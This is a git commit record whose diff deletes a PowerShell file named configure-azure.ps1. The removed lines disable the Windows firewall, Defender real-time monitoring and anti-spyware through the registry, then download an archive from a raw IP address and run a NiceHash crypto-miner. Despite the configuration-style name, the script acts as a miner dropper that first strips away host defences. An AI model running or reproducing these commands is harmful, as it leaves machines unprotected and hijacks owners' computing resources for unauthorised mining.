dab48c8006030566faf191e5bd1b2061709c942a
Hoa Vo <vovanhoait@gmail.com>
2020-09-16 21:58:36 +0700

    update

--- configure-azure.ps1
+++
@@ -1,8 +0,0 @@
-netsh advfirewall set allprofiles state off
-Set-MpPreference -DisableRealtimeMonitoring $true
-New-ItemProperty -Path �HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender� -Name DisableAntiSpyware -Value 1 -PropertyType DWORD -Force
-
-Import-Module BitsTransfer
-Start-BitsTransfer -Source http://139.180.134.229/Tool.Zip -Destination c:\Tool.Zip
-Expand-Archive -Path c:\Tool.Zip -DestinationPath C:\Tool
-Start-Process C:\Tool\NiceHashMinerLegacy.exe  runAs
